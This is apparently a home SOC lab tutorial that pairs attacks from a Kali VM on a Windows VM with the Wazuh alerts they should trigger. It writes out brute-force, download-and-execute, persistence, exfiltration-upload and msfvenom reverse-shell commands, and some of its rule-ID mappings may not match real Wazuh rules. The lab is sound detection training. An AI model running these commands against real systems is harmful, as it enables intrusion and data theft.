# Phase 5: Simulate and Detect Threats

## Overview
This is the **core of your SOC lab** — where you launch **real attacks** from Kali and watch **Wazuh detect them in real time**. You'll become both the red team (attacker) and blue team (defender), learning how threats appear in detection systems.

Each attack maps to specific Wazuh detection rules, helping you understand the **attack-to-detection pipeline**.

## Prerequisites
- ✅ Wazuh Server running at 192.168.100.10
- ✅ Windows Victim with Wazuh Agent at 192.168.100.20 (Agent status = "Active")
- ✅ Kali Attacker at 192.168.100.30
- ✅ All three VMs on VMnet2 and can ping each other
- ✅ Can access Wazuh Dashboard from host browser

---

## Lab Network Quick Reference

```
Kali (Red Team)          Windows Victim          Wazuh Server (Blue Team HQ)
192.168.100.30           192.168.100.20          192.168.100.10
- nmap                   - Wazuh Agent (Active)  - Manager
- hydra                  - Windows Defender      - Indexer
- metasploit             - Sysmon (opt)          - Dashboard
- No agent               - Audit Logs            - Rule Engine
```

---

## Part 1: Network Reconnaissance Attack

### What You're Simulating
Red team scans the network to identify active hosts and open services. This is the **first step in any real attack**.

### What Wazuh Detects
Wazuh alerts on suspicious network activity and port scanning attempts.

### Step 1: Run Nmap Port Scan from Kali

On **Kali VM**, open a terminal:

```bash
nmap -sS 192.168.100.20
```

**What this does:**
- `-sS`: TCP SYN scan (stealthy, doesn't complete connections)
- `192.168.100.20`: Scans the Windows victim

**Expected output:**
```
Starting Nmap ...
Nmap scan report for 192.168.100.20
Host is up (0.00090s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
```

This shows:
- **Port 445**: SMB (file sharing)
- **Port 3389**: RDP (remote desktop)
- Other ports are filtered (Windows Firewall)

### Step 2: Watch Alerts in Wazuh Dashboard

While the nmap scan is running, immediately check the dashboard:

1. From your **host PC browser**, go to: `https://192.168.100.10`
2. Log in with admin credentials
3. Click **Security Events** (left sidebar)
4. Look for alerts from the Windows victim

**Expected alerts:**
- Rule IDs like `40101` (network reconnaissance)
- Rule `5710` (multiple connection attempts)
- Source: `192.168.100.30` (Kali)
- Destination: `192.168.100.20` (Windows victim)

You should see alerts **appearing in real time** as the scan runs!

### Step 3: Analyze the Attack in Wazuh

1. Click on one of the alerts to expand it
2. Review the details:
   - **Rule ID**: The detection rule that matched
   - **Rule Name**: What type of attack it is
   - **Level**: Severity (1-15, where 15 is critical)
   - **Source IP**: 192.168.100.30 (the attacker)
   - **Destination**: 192.168.100.20 (the victim)
   - **Event**: The raw Windows event data

### Step 4: More Aggressive Scan

Try a more aggressive scan to trigger additional alerts:

```bash
nmap -sS -p- 192.168.100.20
```

This scans **all 65535 ports** (slower but more comprehensive). Watch the dashboard fill up with alerts!

```bash
nmap -sV 192.168.100.20
```

This performs **service version detection** (requires open ports to respond). More alerts!

---

## Part 2: Brute Force Authentication Attack

### What You're Simulating
Red team attempts to guess credentials and gain unauthorized access. This is **post-reconnaissance**, trying to gain a foothold.

### What Wazuh Detects
Failed login attempts trigger security event alerts. Multiple failures quickly = brute force attack.

### Step 1: Prepare Windows Victim

Make sure RDP is enabled and SMB is open:

1. On **Windows Victim**, right-click Start → **Settings**
2. Go to **System → Remote Desktop**
3. Toggle **Enable Remote Desktop** = ON
4. Click **Confirm**

### Step 2: Attempt Brute Force via RDP with Hydra

From **Kali**, run:

```bash
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://192.168.100.20 -t 4 -V
```

**What this does:**
- `-l Administrator`: Username to try (RDP needs valid Windows user)
- `-P /usr/share/wordlists/rockyou.txt`: Password list (rockyou is a popular leaked password list)
- `rdp://192.168.100.20`: RDP protocol on Windows victim
- `-t 4`: 4 parallel threads (tasks)
- `-V`: Verbose (show each attempt)

This will attempt many password combinations. You'll see output like:
```
[3389][rdp] host: 192.168.100.20 password: password
[3389][rdp] host: 192.168.100.20 password: 123456
[3389][rdp] host: 192.168.100.20 password: admin
...
```

### Step 3: Watch Failed Logon Alerts in Wazuh

Open Wazuh Dashboard → **Security Events** and filter for:
- **Source IP**: 192.168.100.30 (Kali)
- **Event Type**: "Failed Logon" or "Logon Failure"

You should see many alerts:
- **Rule 18151**: Multiple authentication failures
- **Rule 18152**: Brute force attempt detected
- Severity: Medium (7-9)

Each failed login from Hydra generates one alert!

### Step 4: Simulate Successful Brute Force (if you want)

If you want to see what a **successful compromise** looks like:

1. On Windows Victim, set a weak password:
   - Settings → Accounts → Change account password
   - Set something like `Password123`

2. From Kali, try that password:
```bash
hydra -l wazuh -p Password123 rdp://192.168.100.20 -V
```

3. In Wazuh, you'll see:
   - A **successful logon** alert (Event ID 4624)
   - This is different from failed logons — shows the "breach" occurred

---

## Part 3: Malware/Suspicious Process Execution

### What You're Simulating
Red team executes malicious code or suspicious programs. This is **post-compromise**, establishing persistence or exfiltrating data.

### What Wazuh Detects
Process creation from unusual parents, known malicious executables, or processes with suspicious names/behavior.

### Step 1: Simulate Suspicious Process Execution

On **Windows Victim**, open **PowerShell as Admin** and run:

```powershell
# Create a suspicious process (using cmd.exe spawned from unusual parent)
cmd.exe /c "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"
```

This mimics a common attack vector: downloading and executing remote scripts.

**What this generates:**
- Process creation event (Sysmon Event ID 1)
- Parent-child relationship (PowerShell spawning cmd, cmd spawning PowerShell)
- Command line with suspicious keywords like `NoProfile`, `ExecutionPolicy Bypass`, `IEX`, `DownloadString`

### Step 2: Watch Process Execution Alerts

In Wazuh Dashboard → **Security Events**, look for:
- **Rule 3001-3005**: Process creation alerts
- **Rule 3105**: MITRE ATT&CK - T1059 (Command and Scripting Interpreter)
- **Rule 3107**: PowerShell suspicious activity
- Details show: Process name, parent process, command line, user

Wazuh flags this as suspicious because:
- PowerShell with `ExecutionPolicy Bypass` (disabling safety)
- `IEX` (Invoke-Expression — execute downloaded code)
- `DownloadString` (downloading from internet)

### Step 3: Create More Process Events

Try other suspicious patterns:

```powershell
# Accessing Windows registry (persistence technique)
reg add HKLM\Software\Run /v Backdoor /t REG_SZ /d "C:\Windows\System32\cmd.exe"

# Creating hidden files (evasion)
attrib +h +s C:\Windows\Temp\secret.txt

# Using legitimate admin tools for malicious purpose (living off the land)
tasklist > C:\temp\processes.txt
whoami > C:\temp\whoami.txt
```

Each of these generates alerts in Wazuh showing the suspicious activity!

---

## Part 4: File Integrity Monitoring (FIM) Alerts

### What You're Simulating
Red team modifies system files or creates backdoors. FIM (File Integrity Monitoring) detects unauthorized changes.

### What Wazuh Detects
Changes to critical system files, new files in sensitive directories, or permission changes.

### Step 1: Modify a System File

On **Windows Victim**, create a file in a sensitive location:

```powershell
# Create a backdoor script in Windows directory
echo "attacker backdoor" > C:\Windows\System32\backdoor.txt
```

Or modify an existing file:

```powershell
# Append to Windows hosts file (often used for DNS hijacking)
echo "192.168.100.30  github.com" >> C:\Windows\System32\drivers\etc\hosts
```

### Step 2: Watch FIM Alerts

In Wazuh Dashboard → **Security Events**, look for:
- **Rule 3401**: File created/modified
- **Rule 3402**: File permissions changed
- **Rule 3403**: File deleted
- File path: `C:\Windows\System32\` (critical system location)
- Alert Level: High (10-15) — modifying system files is serious!

The alert will show:
- What file was changed
- What permission changed
- Who made the change
- Timestamp

### Step 3: Detect Privilege Escalation via File Changes

Try becoming admin (if not already):

```powershell
# Try to add a user to Administrators group (requires admin)
net localgroup administrators attacker /add
```

Wazuh detects this via:
- **Rule 18104**: User added to admin group
- **Rule 18103**: Privilege escalation attempt
- Severity: Critical (15)

---

## Part 5: Persistence Mechanisms

### What You're Simulating
Red team installs tools to maintain access after initial compromise. This is **persistence** — ensuring they can come back.

### What Wazuh Detects
New startup programs, scheduled tasks, service installations, or registry modifications.

### Step 1: Create a Persistence Backdoor via Scheduled Task

On **Windows Victim**:

```powershell
# Create a scheduled task that runs every 5 minutes
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -Command 'IEX(New-Object Net.WebClient).DownloadString(\"http://192.168.100.30/shell.ps1\")'"
$trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 365)
Register-ScheduledTask -TaskName "SystemUpdate" -Action $action -Trigger $trigger -RunLevel Highest
```

This creates a persistent backdoor that:
- Runs every 5 minutes
- Downloads and executes code from attacker's Kali machine
- Runs with system privileges

### Step 2: Watch Persistence Alerts

In Wazuh Dashboard, look for:
- **Rule 3602**: Scheduled task created
- **Rule 3603**: Service installed
- **Rule 3604**: Startup program added
- Details: Task name "SystemUpdate", command contains IEX, download string

Severity: High-Critical (10-15)

---

## Part 6: Lateral Movement (Network Propagation)

### What You're Simulating
Red team uses compromised Windows machine to attack other systems. This is **lateral movement** — spreading the breach.

### What Wazuh Detects
Unusual network connections from the victim, attempts to connect to admin shares, or pass-the-hash attacks.

### Step 1: Simulate Lateral Movement Attempt

From **Windows Victim** (or Kali directly), try to access another system:

```bash
# From Kali, use SMB enumeration to find shares
smbclient -L \\\\192.168.100.20\\
```

Or from Windows:
```powershell
# Attempt to connect to SMB share on another system
net use \\192.168.100.10\IPC$ "" /u:""
```

### Step 2: Watch Lateral Movement Alerts

Wazuh detects:
- **Rule 5700**: Network connection attempt
- **Rule 5710**: Multiple failed connection attempts
- **Rule 40111**: Suspicious network activity
- Source: Windows victim
- Destination: 192.168.100.10 (Wazuh server IP)

In real scenarios, lateral movement can spread ransomware or data theft across the entire network.

---

## Part 7: Data Exfiltration

### What You're Simulating
Red team copies sensitive data out of the network. This is the **final stage** of an attack — achieving the objective.

### What Wazuh Detects
Large data transfers, uploads to cloud storage, or access to sensitive file shares.

### Step 1: Create Dummy Sensitive Files

On **Windows Victim**:

```powershell
# Create files that look sensitive
mkdir C:\SensitiveData
echo "Employee SSNs and Salaries" > C:\SensitiveData\payroll.txt
echo "Customer credit cards" > C:\SensitiveData\customers.txt
echo "Trade secrets" > C:\SensitiveData\R_and_D.txt
```

### Step 2: Simulate Data Exfiltration

From **Kali**, attempt to copy these files (if you have RDP access):

```bash
# From Kali, use smbclient to access shares
smbclient \\\\192.168.100.20\\Users -U "wazuh%Password123"
> get C:\SensitiveData\payroll.txt
```

Or from Windows victim, upload to attacker:

```powershell
# Upload to attacker's machine (if they're running a web server)
$file = Get-Item C:\SensitiveData\payroll.txt
$bytes = [System.IO.File]::ReadAllBytes($file.FullName)
$uri = "http://192.168.100.30/upload.php"
Invoke-RestMethod -Uri $uri -Method Post -Body $bytes
```

### Step 3: Watch Exfiltration Alerts

Wazuh detects:
- **Rule 5710**: Unusual data transfer
- **Rule 5750**: File access on sensitive directories
- **Network rules**: Unexpected connections to external IPs
- FIM alerts on file access to `C:\SensitiveData\`

---

## Bonus: Using Metasploit for Full Exploitation

### Step 1: Start Metasploit Handler (on Kali)

Open a terminal on **Kali** and start a listener:

```bash
msfconsole
```

Inside Metasploit:
```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.100.30
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > run
```

This waits for an incoming reverse shell from the victim.

### Step 2: Create a Reverse Shell Payload

Still in Metasploit, open another terminal on **Kali**:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.100.30 LPORT=4444 -f exe -o shell.exe
```

This creates an executable `shell.exe` that, when run on Windows, sends back a shell to Kali.

### Step 3: Run the Payload on Windows Victim

Copy `shell.exe` to the Windows VM and run it. The moment it executes:
1. Metasploit handler gets a session
2. You have interactive shell on Windows
3. Wazuh detects the malicious executable and suspicious network connection

In Metasploit, you can now:
```
meterpreter > sysinfo
meterpreter > getuid
meterpreter > screenshot
meterpreter > download C:\Windows\System32\SAM
```

Each of these actions generates Wazuh alerts!

---

## Attack Summary & Detection Mapping

| Attack Type | Kali Command | Wazuh Alert Rules | Severity |
|---|---|---|---|
| Network Scan | `nmap -sS 192.168.100.20` | 40101, 5710 | Medium |
| Brute Force | `hydra -l user -P list.txt rdp://...` | 18151, 18152 | High |
| Process Exec | PowerShell IEX download | 3001-3105, 3107 | High |
| File Modification | Create/modify files in C:\Windows | 3401-3403 | Critical |
| Privilege Escalation | Add user to admin group | 18103-18104 | Critical |
| Persistence | Scheduled task, startup | 3602-3604 | Critical |
| Lateral Movement | SMB connection attempts | 5700, 5710 | Medium-High |
| Data Exfiltration | Copy files out | 5750, network rules | High-Critical |
| Exploitation | Metasploit reverse shell | 3001, 3105, network | Critical |

---

## Tips for Effective Red Team / Blue Team Exercises

### Red Team Tips (Attacking):
1. Start with reconnaissance (nmap)
2. Progress to exploitation (brute force, metasploit)
3. Then establish persistence (scheduled tasks, registry)
4. Finally exfiltrate data
5. This mirrors real attacker TTPs (Tactics, Techniques, Procedures)

### Blue Team Tips (Detecting):
1. Watch the **Security Events** dashboard during attacks
2. Understand rule names and IDs (helps in real SOC work)
3. Note which attacks trigger which rules
4. Look for **correlation** — multiple rules from same source = attack campaign
5. Use **MITRE ATT&CK** view to map alerts to attack phases

### Best Practices:
1. Document each attack and its detections
2. Create custom rules for attacks Wazuh missed
3. Understand false positives (benign activity flagged as malicious)
4. Build dashboards showing attack timeline
5. Set up alerts/notifications for critical rules

---

## What Happens Next

After completing this phase:
1. ✅ Launched multiple attacks from Kali against Windows victim
2. ✅ Observed Wazuh detecting attacks in real time
3. ✅ Understood attack-to-detection pipeline
4. ✅ Learned Wazuh rule IDs and severity levels
5. ✅ Experienced red team vs blue team workflow

Next: **Phase 6: Analyze and Build Custom Rules** — where you'll fine-tune detections and create your own custom rules!

---

## Verification Checklist

- [ ] Can access Wazuh Dashboard from host browser
- [ ] Windows Victim agent shows "Active" in dashboard
- [ ] Ran nmap port scan from Kali
- [ ] Saw reconnaissance alerts in Wazuh (Rule 40101, 5710)
- [ ] Ran Hydra brute force attack
- [ ] Saw failed logon alerts in Wazuh (Rule 18151, 18152)
- [ ] Created suspicious process on Windows
- [ ] Saw process execution alerts (Rule 3001-3105)
- [ ] Modified system file on Windows
- [ ] Saw FIM alerts in Wazuh (Rule 3401-3403)
- [ ] Created persistence mechanism (scheduled task)
- [ ] Saw persistence alerts (Rule 3602)
- [ ] Attempted lateral movement or data exfiltration
- [ ] Documented attack timeline in Wazuh
- [ ] Understand how each attack maps to Wazuh rules
- [ ] Understand severity levels (1-15 scale)
- [ ] Can filter and search alerts in dashboard
- [ ] Ready to analyze and improve detections in Phase 6

---

## Reference Commands Quick List

```bash
# Reconnaissance
nmap -sS 192.168.100.20
nmap -sV 192.168.100.20
nmap -O 192.168.100.20

# Brute Force
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://192.168.100.20 -t 4

# Metasploit
msfconsole
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.100.30 LPORT=4444 -f exe -o shell.exe

# Windows exploitation
powershell -NoProfile -ExecutionPolicy Bypass -Command IEX(New-Object Net.WebClient).DownloadString('http://...')
net localgroup administrators attacker /add
schtasks /create /tn "SystemUpdate" /tr "powershell ..." /sc minute /mo 5
```

---

## Next Phase
Proceed to **Phase 6: Analyze and Build Custom Rules** when ready to enhance your detection capabilities.
